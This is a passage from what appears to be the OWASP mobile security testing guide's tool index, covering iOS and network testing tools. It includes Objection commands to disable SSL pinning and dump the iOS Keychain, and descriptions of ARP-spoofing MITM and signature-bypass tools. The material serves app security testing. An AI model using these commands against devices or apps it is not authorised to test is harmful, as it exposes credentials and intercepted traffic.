frida-server installed, Objection can connect directly to the running Frida server to provide all its functionality without needing to repackage the application. However, it is not always possible to jailbreak the latest version of iOS, or you may have an application with advanced jailbreak detection mechanisms.</p> <p>The ability to perform advanced dynamic analysis on non-jailbroken devices is one of the features that makes Objection incredibly useful. After following the repackaging process ( Signing IPA files) you will be able to run all the aforementioned commands which make it very easy to quickly analyze an application, or get around basic security controls.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0074/#using-objection-on-ios","title":"Using Objection on iOS","text":"<p>Starting up Objection depends on whether you've patched the IPA or whether you are using a jailbroken device running Frida-server. For running a patched IPA, objection will automatically find any attached devices and search for a listening Frida gadget. However, when using frida-server, you need to explicitly tell frida-server which application you want to analyze.</p> <pre><code># Connecting to a patched IPA\n$ objection explore\n\n# Using frida-ps to get the correct application name\n$ frida-ps -Ua | grep -i Telegram\n983  Telegram\n\n# Connecting to the Telegram app through Frida-server\n$ objection --gadget=\"Telegram\" explore\n</code></pre> <p>Once you are in the Objection REPL, you can execute any of the available commands. Below is an overview of some of the most useful ones:</p> <pre><code># Show the different storage locations belonging to the app\n$ env\n\n# Disable popular ssl pinning methods\n$ ios sslpinning disable\n\n# Dump the Keychain\n$ ios keychain dump\n\n# Dump the Keychain, including access modifiers. The result will be written to the host in myfile.json\n$ ios keychain dump --json &lt;myfile.json&gt;\n\n# Show the content of a plist file\n$ ios plist cat &lt;myfile.plist&gt;\n</code></pre> <p>More information on using the Objection REPL can be found on the Objection Wiki</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0102/","title":"MASTG-TOOL-0102: ios-app-signer","text":"<p> ios-app-signer is a GUI-based tool for macOS that allows you to re-sign iOS apps and bundle them into IPA files ready to be installed on an iOS device. It can be installed using the <code>.app</code> file from the GitHub releases or via brew on macOS:</p> <pre><code>brew install --cask ios-app-signer\n</code></pre> <p>For more information about installation and use, see their website.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0105/","title":"MASTG-TOOL-0105: ipsw","text":"<p>  IPSW calls itself an \"iOS/macOS Research Swiss Army Knife\". In general, IPSW allows you to obtain iOS specific files (IPSW, OTA, ...) and also statically analyze them. For application analysis, the most interesting features are the Objective-C and Swift class-dumps. Other features are available (kernelcache parser, device-tree parser, disassembler, etc) but are only useful if you're analyzing the security of the OS itself.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0105/#extracting-objective-c-class-information","title":"Extracting Objective-C Class Information","text":"<p>IPSW can extract Objective-C class information from a MachO binary. The desired architecture can be specified using <code>--arch</code> in case of a universal MachO file:</p> <pre><code>$ ipsw class-dump --arch arm64 UnCrackable\\ Level\\ 1\n\n@protocol NSObject\n\n@required\n\n...\n\n-[UIApplicationDelegate applicationDidFinishLaunching:];\n-[UIApplicationDelegate application:willFinishLaunchingWithOptions:];\n-[UIApplicationDelegate application:didFinishLaunchingWithOptions:];\n-[UIApplicationDelegate applicationDidBecomeActive:];\n\n...\n</code></pre> Full command output <pre><code>$ ipsw class-dump --arch arm64 UnCrackable\\ Level\\ 1\n\n@protocol NSObject\n\n@required\n\n@property (TQ,R) hash;\n@property (T#,R) superclass;\n@property (T@\"NSString\",R,C) description;\n@property (T@\"NSString\",R,C) debugDescription;\n\n/* required instance methods */\n-[NSObject isEqual:];\n-[NSObject class];\n-[NSObject self];\n-[NSObject performSelector:];\n-[NSObject performSelector:withObject:];\n-[NSObject performSelector:withObject:withObject:];\n-[NSObject isProxy];\n-[NSObject isKindOfClass:];\n-[NSObject isMemberOfClass:];\n-[NSObject conformsToProtocol:];\n-[NSObject respondsToSelector:];\n-[NSObject retain];\n-[NSObject release];\n-[NSObject autorelease];\n-[NSObject retainCount];\n-[NSObject zone];\n-[NSObject hash];\n-[NSObject superclass];\n-[NSObject description];\n\n@optional\n\n/* optional instance methods */\n-[NSObject debugDescription];\n\n@end\n\n@protocol UIApplicationDelegate &lt;NSObject&gt;\n\n@required\n\n@property (T@\"UIWindow\",&amp;,N) window;\n\n@optional\n\n/* optional instance methods */\n-[UIApplicationDelegate applicationDidFinishLaunching:];\n-[UIApplicationDelegate application:willFinishLaunchingWithOptions:];\n-[UIApplicationDelegate application:didFinishLaunchingWithOptions:];\n-[UIApplicationDelegate applicationDidBecomeActive:];\n-[UIApplicationDelegate applicationWillResignActive:];\n-[UIApplicationDelegate application:handleOpenURL:];\n-[UIApplicationDelegate application:openURL:sourceApplication:annotation:];\n-[UIApplicationDelegate application:openURL:options:];\n-[UIApplicationDelegate applicationDidReceiveMemoryWarning:];\n-[UIApplicationDelegate applicationWillTerminate:];\n-[UIApplicationDelegate applicationSignificantTimeChange:];\n-[UIApplicationDelegate application:willChangeStatusBarOrientation:duration:];\n-[UIApplicationDelegate application:didChangeStatusBarOrientation:];\n-[UIApplicationDelegate application:willChangeStatusBarFrame:];\n-[UIApplicationDelegate application:didChangeStatusBarFrame:];\n-[UIApplicationDelegate application:didRegisterUserNotificationSettings:];\n-[UIApplicationDelegate application:didRegisterForRemoteNotificationsWithDeviceToken:];\n-[UIApplicationDelegate application:didFailToRegisterForRemoteNotificationsWithError:];\n-[UIApplicationDelegate application:didReceiveRemoteNotification:];\n-[UIApplicationDelegate application:didReceiveLocalNotification:];\n-[UIApplicationDelegate application:handleActionWithIdentifier:forLocalNotification:completionHandler:];\n-[UIApplicationDelegate application:handleActionWithIdentifier:forRemoteNotification:withResponseInfo:completionHandler:];\n-[UIApplicationDelegate application:handleActionWithIdentifier:forRemoteNotification:completionHandler:];\n-[UIApplicationDelegate application:handleActionWithIdentifier:forLocalNotification:withResponseInfo:completionHandler:];\n-[UIApplicationDelegate application:didReceiveRemoteNotification:fetchCompletionHandler:];\n-[UIApplicationDelegate application:performFetchWithCompletionHandler:];\n-[UIApplicationDelegate application:performActionForShortcutItem:completionHandler:];\n-[UIApplicationDelegate application:handleEventsForBackgroundURLSession:completionHandler:];\n-[UIApplicationDelegate application:handleWatchKitExtensionRequest:reply:];\n-[UIApplicationDelegate applicationShouldRequestHealthAuthorization:];\n-[UIApplicationDelegate applicationDidEnterBackground:];\n-[UIApplicationDelegate applicationWillEnterForeground:];\n-[UIApplicationDelegate applicationProtectedDataWillBecomeUnavailable:];\n-[UIApplicationDelegate applicationProtectedDataDidBecomeAvailable:];\n-[UIApplicationDelegate application:supportedInterfaceOrientationsForWindow:];\n-[UIApplicationDelegate application:shouldAllowExtensionPointIdentifier:];\n-[UIApplicationDelegate application:viewControllerWithRestorationIdentifierPath:coder:];\n-[UIApplicationDelegate application:shouldSaveApplicationState:];\n-[UIApplicationDelegate application:shouldRestoreApplicationState:];\n-[UIApplicationDelegate application:willEncodeRestorableStateWithCoder:];\n-[UIApplicationDelegate application:didDecodeRestorableStateWithCoder:];\n-[UIApplicationDelegate application:willContinueUserActivityWithType:];\n-[UIApplicationDelegate application:continueUserActivity:restorationHandler:];\n-[UIApplicationDelegate application:didFailToContinueUserActivityWithType:error:];\n-[UIApplicationDelegate application:didUpdateUserActivity:];\n-[UIApplicationDelegate application:userDidAcceptCloudKitShareWithMetadata:];\n-[UIApplicationDelegate window];\n-[UIApplicationDelegate setWindow:];\n\n@end\n\n@protocol __ARCLiteKeyedSubscripting__\n\n@required\n\n/* required instance methods */\n-[__ARCLiteKeyedSubscripting__ objectForKeyedSubscript:];\n-[__ARCLiteKeyedSubscripting__ setObject:forKeyedSubscript:];\n\n@optional\n\n@end\n\n@interface AppDelegate : UIResponder &lt;UIApplicationDelegate&gt; {\n    /* instance variables */\n    @\"UIWindow\" _window;\n}\n\n@property (T@\"UIWindow\",&amp;,N,V_window) window;\n@property (TQ,R) hash;\n@property (T#,R) superclass;\n@property (T@\"NSString\",R,C) description;\n@property (T@\"NSString\",R,C) debugDescription;\n\n/* instance methods */\n-[AppDelegate application:didFinishLaunchingWithOptions:];\n-[AppDelegate applicationWillResignActive:];\n-[AppDelegate applicationDidEnterBackground:];\n-[AppDelegate applicationWillEnterForeground:];\n-[AppDelegate applicationDidBecomeActive:];\n-[AppDelegate applicationWillTerminate:];\n-[AppDelegate window];\n-[AppDelegate setWindow:];\n\n@end\n\n@interface ViewController : UIViewController {\n    /* instance variables */\n    @\"UILabel\" _theLabel;\n    @\"UILabel\" _Hint;\n    @\"UITextField\" _theTextField;\n    @\"UIButton\" _bVerify;\n}\n\n@property (T@\"UILabel\",W,N,V_theLabel) theLabel;\n@property (T@\"UILabel\",W,N,V_Hint) Hint;\n@property (T@\"UITextField\",W,N,V_theTextField) theTextField;\n@property (T@\"UIButton\",W,N,V_bVerify) bVerify;\n\n/* instance methods */\n-[ViewController viewDidLoad];\n-[ViewController buttonClick:];\n-[ViewController didReceiveMemoryWarning];\n-[ViewController theLabel];\n-[ViewController setTheLabel:];\n-[ViewController Hint];\n-[ViewController setHint:];\n-[ViewController theTextField];\n-[ViewController setTheTextField:];\n-[ViewController bVerify];\n-[ViewController setBVerify:];\n\n@end\n</code></pre>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0105/#extracting-swift-class-information","title":"Extracting Swift Class Information","text":"<p>IPSW can output the available Swift symbols with <code>ipsw swift-dump</code>. By default, the location of the identified structures and symbols is not printed, but this can be enabled by using the <code>-V</code> flag:</p> <pre><code>$ ipsw swift-dump --arch arm64 ./MASTestApp -V\n\nSwift TOC\n--------\n  __swift5_builtin  = 0\n  __swift5_types(2) = 3\n  __swift5_protos   = 0\n  __swift5_proto    = 2\n\nTYPES\n-----\n\n// 0x10000a760\nstruct MASTestApp.ContentView { // accessor 0x1000081e4\n    /* 0x10000b064 */ var _displayText: _$s7SwiftUI5StateVMn _$sSS\n}\n\n// 0x10000a7a4\nstruct MASTestApp.MASTestAppApp {} // accessor 0x10000a200\n\n// 0x10000a7f0\nclass MASTestApp.ResourceBundleClass { // accessor 0x10000a2c4\n  /* methods */\n    /* 0x10000a824 */ // &lt;stripped&gt; static func init\n}\n...\n</code></pre> Full command output <pre><code>$ ipsw swift-dump --arch arm64 ./MASTestApp -V\n\nSwift TOC\n--------\n__swift5_builtin  = 0\n__swift5_types(2) = 3\n__swift5_protos   = 0\n__swift5_proto    = 2\n\nTYPES\n-----\n\n// 0x10000a760\nstruct MASTestApp.ContentView { // accessor 0x1000081e4\n    /* 0x10000b064 */ var _displayText: _$s7SwiftUI5StateVMn _$sSS\n}\n\n// 0x10000a7a4\nstruct MASTestApp.MASTestAppApp {} // accessor 0x10000a200\n\n// 0x10000a7f0\nclass MASTestApp.ResourceBundleClass { // accessor 0x10000a2c4\n/* methods */\n    /* 0x10000a824 */ // &lt;stripped&gt; static func init\n}\n\nPROTOCOL CONFORMANCES\n---------------------\n\n// 0x10000a668\nprotocol conformance MASTestApp.ContentView : _$s7SwiftUI4ViewMp {\n/* resilient witnesses */\n    /* 0x10000a83d */ _$s7SwiftUI4ViewP4BodyAC_AaBTn\n    /* 0x10000a845 */ _$s4Body7SwiftUI4ViewPTl\n    /* 0x100009924 */ _$s7SwiftUI4ViewP05_makeC04view6inputsAA01_C7OutputsVAA11_GraphValueVyxG_AA01_C6InputsVtFZTq\n    /* 0x100009928 */ _$s7SwiftUI4ViewP05_makeC4List4view6inputsAA01_cE7OutputsVAA11_GraphValueVyxG_AA01_cE6InputsVtFZTq\n    /* 0x10000992c */ _$s7SwiftUI4ViewP14_viewListCount6inputsSiSgAA01_ceF6InputsV_tFZTq\n    /* 0x100009944 */ _$s7SwiftUI4ViewP4body4BodyQzvgTq\n}\n\n// 0x10000a6fc\nprotocol conformance MASTestApp.MASTestAppApp : _$s7SwiftUI3AppMp {\n/* resilient witnesses */\n    /* 0x10000afff */ _$s7SwiftUI3AppP4BodyAC_AA5SceneTn\n    /* 0x10000b007 */ _$s4Body7SwiftUI3AppPTl\n    /* 0x10000a0d4 */ _$s7SwiftUI3AppP4body4BodyQzvgTq\n    /* 0x10000a184 */ _$s7SwiftUI3AppPxycfCTq\n}\n\nASSOCIATED TYPES\n---------------------\n\n// 0x10000b088\nextension MASTestApp.ContentView: _$s7SwiftUI4ViewP {\n    /* 0x10000b03f */ typealias Body = _$s7SwiftUI15ModifiedContentVMn _$s7SwiftUI6VStackVMn _$s7SwiftUI9TupleViewVMn _$syAA -&gt; _$s7SwiftUI6HStackVMn _$syAC -&gt; _$s7SwiftUI4TextVMn _$s_ _$s7SwiftUI6SpacerVMn _$sAAyAAyAA -&gt; _$s7SwiftUI6ButtonVMn _$syAAyAAyAAyAE _$s7SwiftUI14_PaddingLayoutVMn _$sGAHG _$s7SwiftUI30_EnvironmentKeyWritingModifierVMn _$s7SwiftUI4FontVMn _$sSgGGG -&gt; _$s7SwiftUI24_BackgroundStyleModifierVMn _$s7SwiftUI14LinearGradientVMn _$sGG -&gt; _$s7SwiftUI11_ClipEffectVMn _$s7SwiftUI16RoundedRectangleVMn _$sGGAHGtGGAHG_AAyAAyAAyAA -&gt; _$s7SwiftUI10ScrollViewVMn _$syAAyAAyAE _$s7SwiftUI16_FlexFrameLayoutVMn _$sGAHGGA2_GAQ -&gt; _$s7SwiftUI5ColorVMn _$sGGAWGAHGtGGAH\n}\n\n// 0x10000b0a0\nextension MASTestApp.MASTestAppApp: _$s7SwiftUI3AppP {\n    /* 0x10000b044 */ typealias Body = _$s7SwiftUI11WindowGroupVMn MASTestApp.ContentView\n}\n</code></pre>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0111/","title":"MASTG-TOOL-0111: ldid","text":"<p>  ldid is a Link Identity Editor created by Saurik. It allows you to view and update the entitlements of a MachO binary.</p> <p>The original source can be found at https://git.saurik.com/ldid.git, while precompiled versions are available from the ProcursusTeam's repo.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0114/","title":"MASTG-TOOL-0114: codesign","text":"<p>The codesign tool is primarily used to create, verify, and display code signatures, and to query the dynamic status of signed code in the system. Although Xcode typically automates the process of signing code during builds and before distribution, there are scenarios where manual intervention with codesign is required. This can include inspecting or verifying the details of an app's code signature, or manually re-signing an app. For more detailed tasks such as these, you can use the codesign command line tool directly, as described in Apple's Code Signing Guide.</p> <p>Learn more:</p> <ul> <li>\"Examining a Code Signature\"</li> <li>\"Signing Code Manually\" in Apple's Code Signing Guide</li> <li>Using the latest code signature format</li> <li>codesign manpage</li> <li>codesign source code</li> </ul>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0117/","title":"MASTG-TOOL-0117: fastlane","text":"<p> fastlane is a tool for iOS and Android developers to automate tasks like dealing with provisioning profiles, and releasing mobile apps. On iOS, it's especially useful to resign IPA files with your Xcode provisioning profile.</p> <p>fastlane can be installed via brew (<code>brew install fastlane</code>).</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0118/","title":"MASTG-TOOL-0118: Sideloadly","text":"<p>Sideloadly allows you to obtain a valid signature for a given IPA file and then install it to a connected iOS device. In addition to signing and installing an IPA file, Sideloadly also allows you to inject tweaks, change the App or Bundle name or make other limited modifications to the IPA metadata. Sideloadly is available on both macOS and Windows.</p> <p>Do not use your personal Apple account</p> <p>To sign an IPA file, you will need a valid iOS developer account, either free or paid. Both types come with certain restrictions, as explained in  Obtaining a Developer Provisioning Profile. We recommend creating a dedicated developer account for signing test applications, and not using your personal Apple account.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0121/","title":"MASTG-TOOL-0121: objdump - iOS","text":"<p>objdump is a tool to inspect object files, executables and libraries. It can disassemble instructions or show symbol tables, headers and sections. There are implementations in GNU Binutils and in LLVM.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0122/","title":"MASTG-TOOL-0122: c++filt","text":"<p>c++filt is a demangling tool that converts mangled C++ symbols into human readable strings by calling <code>c++filt &lt;symbol&gt;</code>. See the man page for more information on its usage.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0126/","title":"MASTG-TOOL-0126: libimobiledevice suite","text":"<p>The libimobiledevice suite is cross-platform protocol library for interacting with iOS devices. The different libraries can be compiled into binaries for direct interaction with iOS devices from the command line.</p> <p>Warning</p> <p>While many package repositories (apt, brew, cargo, ...) have versions of libimobiledevice tools, they are often outdated. We recommend compiling the different tools from source for the best results. Note that even if your package manager has the latest version based on <code>-v</code>, the source code will still be more up-to-date.</p> <p>The following tools are part of the libimobiledevice suite:</p> Tool Purpose idevice_id List attached devices or print device name of given device. idevicebackup Create or restore backup from the current or specified directory (&lt;iOS 4). idevicebackup2 Create or restore backup from the current or specified directory (&gt;= iOS 4). idevicecrashreport Move crash reports from device to a local DIRECTORY. idevicedate Display the current date or set it on a device. idevicedebug Interact with the debugserver service of a device. idevicedebugserverproxy Proxy debugserver connection from device to a local socket at PORT. idevicediagnostics Use diagnostics interface of a device running iOS 4 or later. ideviceenterrecovery Makes a device with the supplied UDID enter recovery mode immediately. ideviceimagemounter Mounts the specified disk image on the device. ideviceinfo Show information about a connected device. ideviceinstaller Manage apps on iOS devices. idevicename Display the device name or set it to NAME if specified. idevicenotificationproxy Post or observe notifications on a device. idevicepair Manage host pairings with devices and usbmuxd. ideviceprovision Manage provisioning profiles on a device. idevicescreenshot Gets a screenshot from a device. idevicesetlocation Sets the location on a device. idevicesyslog Relay syslog of a connected device. inetcat Opens a read/write interface via STDIN/STDOUT to a TCP port on a usbmux device. iproxy Proxy that binds local TCP ports to be forwarded to the specified ports on a usbmux device. plistutil Convert a plist FILE between binary, XML, JSON, and OpenStep format.","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0127/","title":"MASTG-TOOL-0127: AppSync Unified","text":"<p>  AppSync Unified disables various IPA signature verifications on jailbroken iOS devices, allowing you to install IPA files with missing or incorrect signatures. AppSync Unified does not require any configuration after installation and does not offer a direct way to install IPA files either.</p> <p>Warning</p> <p>You can normally install AppSync Unified from the <code>https://cydia.akemi.ai/</code> repository by adding it to the package manager on your iOS device. However, as this repository is not always available, you can alternatively download the .deb file from the releases page and install it using <code>dpkg -i</code> on the device.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0128/","title":"MASTG-TOOL-0128: Filza","text":"<p>Filza is a file manager for jailbroken iOS devices. It can be installed by adding the Tigisoftware repo to your package manager and searching for Filza.</p> <p>In addition to letting you browse the file system, you can also use Filza to easily install IPA files. Simply navigate to the IPA file on your filesystem, and click on <code>Install</code> in the top right corner.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0135/","title":"MASTG-TOOL-0135: PlistBuddy","text":"<p>PlistBuddy is available on macOS and allows you to print and modify <code>.plist</code> files. It is not on the default PATH, but it can be run via <code>/usr/libexec/PlistBuddy</code>. PlistBuddy uses a custom syntax to execute commands on the given plist file.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0135/#printing-a-plist-file","title":"Printing a Plist File","text":"<p>The example below prints an ASCII representation of the Info.plist file of  iOS UnCrackable L1 by specifying the <code>Print</code> command:</p> <pre><code>/usr/libexec/PlistBuddy -c \"Print\" Info.plist\nDict {\n    DTXcode = 0821\n    DTSDKName = iphoneos10.2\n    CFBundleName = UnCrackable Level 1\n    UILaunchStoryboardName = LaunchScreen\n    CFBundleIcons~ipad = Dict {\n        CFBundlePrimaryIcon = Dict {\n            CFBundleIconFiles = Array {\n                AppIcon-120x20\n                AppIcon-129x29\n                AppIcon-140x40\n                AppIcon-157x57\n                AppIcon-160x60\n                AppIcon-150x50\n                AppIcon-172x72\n                AppIcon-176x76\n                AppIcon-183.5x83.5\n            }\n        }\n    }\n    DTSDKBuild = 14C89\n    CFBundleDevelopmentRegion = en\n    CFBundleVersion = 1\n    BuildMachineOSBuild = 15G1212\n    DTPlatformName = iphoneos\n    CFBundleShortVersionString = 1.0\n    UIMainStoryboardFile = Main\n    CFBundleSupportedPlatforms = Array {\n        iPhoneOS\n    }\n    CFBundlePackageType = APPL\n    CFBundleInfoDictionaryVersion = 6.0\n    UIRequiredDeviceCapabilities = Array {\n        armv7\n    }\n    CFBundleExecutable = UnCrackable Level 1\n    DTCompiler = com.apple.compilers.llvm.clang.1_0\n    UISupportedInterfaceOrientations~ipad = Array {\n        UIInterfaceOrientationPortrait\n        UIInterfaceOrientationPortraitUpsideDown\n        UIInterfaceOrientationLandscapeLeft\n        UIInterfaceOrientationLandscapeRight\n    }\n    CFBundleIdentifier = sg.vp.UnCrackable1\n    MinimumOSVersion = 8.0\n    DTXcodeBuild = 8C1002\n    DTPlatformVersion = 10.2\n    LSRequiresIPhoneOS = true\n    UISupportedInterfaceOrientations = Array {\n        UIInterfaceOrientationPortrait\n        UIInterfaceOrientationLandscapeLeft\n        UIInterfaceOrientationLandscapeRight\n    }\n    CFBundleDisplayName = UnCrackable1\n    CFBundleIcons = Dict {\n        CFBundlePrimaryIcon = Dict {\n            CFBundleIconFiles = Array {\n                AppIcon-120x20\n                AppIcon-129x29\n                AppIcon-140x40\n                AppIcon-157x57\n                AppIcon-160x60\n            }\n        }\n    }\n    UIDeviceFamily = Array {\n        1\n        2\n    }\n    DTPlatformBuild = 14C89\n}\n</code></pre> <p>You can also print specific entries. Dictionary properties are specified via <code>:</code> and array indices are 0-based. The command below prints the third app icon format:</p> <pre><code>/usr/libexec/PlistBuddy -c \"Print CFBundleIcons~ipad:CFBundlePrimaryIcon:CFBundleIconFiles:2\" Info.plist\nAppIcon-140x40\n</code></pre>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0135/#changing-plist-values","title":"Changing Plist Values","text":"<p>PlistBuddy can also change values via the <code>Set &lt;key&gt; &lt;value&gt;</code> command. The following example updates the CFBundleDisplayName:</p> <pre><code>/usr/libexec/PlistBuddy -c \"Set CFBundleDisplayName 'My New App Name'\" Info.plist\n/usr/libexec/PlistBuddy -c \"Print CFBundleDisplayName\" Info.plist\nMy New App Name\n</code></pre>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0135/#adding-and-deleting-plist-values","title":"Adding and Deleting Plist Values","text":"<p>Entries can be added and deleted by specifying the key, value and type:</p> <pre><code>/usr/libexec/PlistBuddy -c \"Add CustomDictionary dict\" Info.plist\n/usr/libexec/PlistBuddy -c \"Add CustomDictionary:CustomProperty string 'OWASP MAS'\" Info.plist\n/usr/libexec/PlistBuddy -c \"Print CustomDictionary\" Info.plist\nDict {\n    CustomProperty = OWASP MAS\n}\n</code></pre>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0136/","title":"MASTG-TOOL-0136: plistlib","text":"<p>The plistlib module is part of the Python standard library and allows you to programmatically read, modify, and write <code>.plist</code> (Property List) files. It supports both XML and binary plist formats and provides a native dictionary-based API.</p> <p>This makes <code>plistlib</code> a cross-platform alternative to  PlistBuddy, suitable for scripting or automation use cases.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0136/#reading-a-plist-file","title":"Reading a Plist File","text":"<p>The following example prints the contents of a plist file by loading it into a Python dictionary:</p> <pre><code>import plistlib\n\nwith open(\"Info.plist\", \"rb\") as f:\n    plist = plistlib.load(f)\n\nprint(plist)\n</code></pre> <p>This prints a dictionary representation of the plist, which can be inspected and modified like any other Python dict.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0136/#reading-specific-plist-entries","title":"Reading Specific Plist Entries","text":"<p>After parsing the plist, you can access dictionary keys and array elements using regular Python syntax. The example below prints the third app icon format:</p> <pre><code>print(plist[\"CFBundleIcons~ipad\"][\"CFBundlePrimaryIcon\"][\"CFBundleIconFiles\"][2])\n# Output: AppIcon-140x40\n</code></pre>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0136/#changing-plist-values","title":"Changing Plist Values","text":"<p>To modify an entry such as the <code>CFBundleDisplayName</code>, assign a new value and write the updated dict back to the file using <code>plistlib.dump</code>:</p> <pre><code>plist[\"CFBundleDisplayName\"] = \"My New App Name\"\n\nwith open(\"Info.plist\", \"wb\") as f:\n    plistlib.dump(plist, f)\n</code></pre>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0136/#adding-and-deleting-plist-values","title":"Adding and Deleting Plist Values","text":"<p>New keys can be added or removed using regular Python dict operations:</p> <pre><code># Add a new dictionary\nplist[\"CustomDictionary\"] = {\"CustomProperty\": \"OWASP MAS\"}\n\n# Delete a key\ndel plist[\"CustomDictionary\"][\"CustomProperty\"]\n\n# Save the updated plist\nwith open(\"Info.plist\", \"wb\") as f:\n    plistlib.dump(plist, f)\n</code></pre>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0137/","title":"MASTG-TOOL-0137: GlobalWebInspect","text":"<p>Warning</p> <p>This tool may or may not work depending on your macOS / iOS combination.</p> <p>GlobalWebInspect can be installed on a jailbroken iOS device to enable web inspection on any WebView in any application. You can install the tweak by copying it over to your device and using <code>sudo dpkg -i &lt;file&gt;</code>.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0138/","title":"MASTG-TOOL-0138: ipainstaller","text":"<p>  ipainstaller allows you to install IPA files from an SSH session on a jailbroken iOS device.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0139/","title":"MASTG-TOOL-0139: ElleKit","text":"<p>  ElleKit is a function-hooking framework used by the popular jailbreaks Dopamine and palera1n. It provides an API for both Substrate and libhooker.</p> <p>Tweaks installed via  Sileo will often use ElleKit to alter the behavior of an app by modifying function arguments, return values of implementations, as described in  Dynamic Analysis on iOS.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0141/","title":"MASTG-TOOL-0141: IOSSecuritySuite","text":"<p>  A library used to detect if a device is jailbroken.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0142/","title":"MASTG-TOOL-0142: Choicy","text":"<p>  Choicy is an advanced tweak configurator for jailbroken iOS devices. It allows you to prevent injection of tweaks into specific applications, which can help with hiding the jailbroken nature of the device.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0075/","title":"MASTG-TOOL-0075: Android tcpdump","text":"<p>A command line packet capture utility for Android.</p>","tags":["network","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0076/","title":"MASTG-TOOL-0076: bettercap","text":"<p>  A powerful framework which aims to offer to security researchers and reverse engineers an easy to use, all-in-one solution for Wi-Fi, Bluetooth Low Energy, wireless HID hijacking and Ethernet networks reconnaissance. It can be used during network penetration tests in order to simulate a Machine-in-the-Middle (MITM) attack. This is achieved by executing ARP poisoning or spoofing to the target computers. When such an attack is successful, all packets between two computers are redirected to a third computer that acts as the MITM and is able to intercept the traffic for analysis.</p> <p>bettercap is a powerful tool to execute MITM attacks and should be preferred nowadays, instead of ettercap. See also Why another MITM tool? on the bettercap site.</p> <p>bettercap is available for all major Linux and Unix operating systems and should be part of their respective package installation mechanisms. You need to install it on your host computer that will act as the MITM. On macOS it can be installed by using brew.</p> <pre><code>brew install bettercap\n</code></pre> <p>For Kali Linux you can install bettercap with <code>apt-get</code>:</p> <pre><code>apt-get update\napt-get install bettercap\n</code></pre> <p>There are installation instructions as well for Ubuntu Linux 18.04 on LinuxHint.</p>","tags":["network","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0077/","title":"MASTG-TOOL-0077: Burp Suite","text":"<p>Burp Suite is an integrated platform for performing security testing mobile and web applications.</p> <p>Its tools work together seamlessly to support the entire testing process, from initial mapping and analysis of attack surfaces to finding and exploiting security vulnerabilities. Burp Proxy operates as a web proxy server for Burp Suite, which is positioned as a Machine-in-the-Middle (MITM) between the browser and web servers. Burp Suite allows you to intercept, inspect, and modify incoming and outgoing raw HTTP traffic.</p> <p>Setting up Burp to proxy your traffic is pretty straightforward. We assume that both your device and host computer are connected to a Wi-Fi network that permits client-to-client traffic.</p> <p>PortSwigger provides good tutorials on setting up both Android as iOS devices to work with Burp:</p> <ul> <li>Configuring an Android Device to Work With Burp.</li> <li>Installing Burp's CA certificate to an Android device.</li> <li>Configuring an iOS Device to Work With Burp.</li> <li>Installing Burp's CA certificate to an iOS device.</li> </ul> <p>Please refer to  Setting Up an Interception Proxy (Android) and  Setting up an Interception Proxy (iOS) for more information.</p>","tags":["network","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0078/","title":"MASTG-TOOL-0078: MITM Relay","text":"<p>  A script to intercept and modify non-HTTP protocols through Burp and others with support for SSL and STARTTLS interception - https://github.com/jrmdev/mitm_relay</p>","tags":["network","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0079/","title":"MASTG-TOOL-0079: ZAP","text":"<p> ZAP (Zed Attack Proxy) is a free security tool which helps to automatically find security vulnerabilities in web applications and web services.</p>","tags":["network","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0080/","title":"MASTG-TOOL-0080: tcpdump","text":"<p>A command line packet capture utility - https://www.tcpdump.org/</p>","tags":["network","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0081/","title":"MASTG-TOOL-0081: Wireshark","text":"<p>  An open-source packet analyzer - https://www.wireshark.org/download.html</p>","tags":["network","tool"]},{"location":"MASTG/tools/network/MASTG-TOOL-0097/","title":"MASTG-TOOL-0097: mitmproxy","text":"<p> mitmproxy is a free and open source interactive HTTPS intercepting proxy.</p> <ul> <li>Command Line: <code>mitmdump</code> is the command-line version of mitmproxy. Think tcpdump for HTTP. It can be used to intercept, inspect, modify and replay web traffic such as HTTP/1, HTTP/2, WebSockets, or any other SSL/TLS-protected protocols. You can prettify and decode a variety of message types ranging from HTML to Protobuf, intercept specific messages 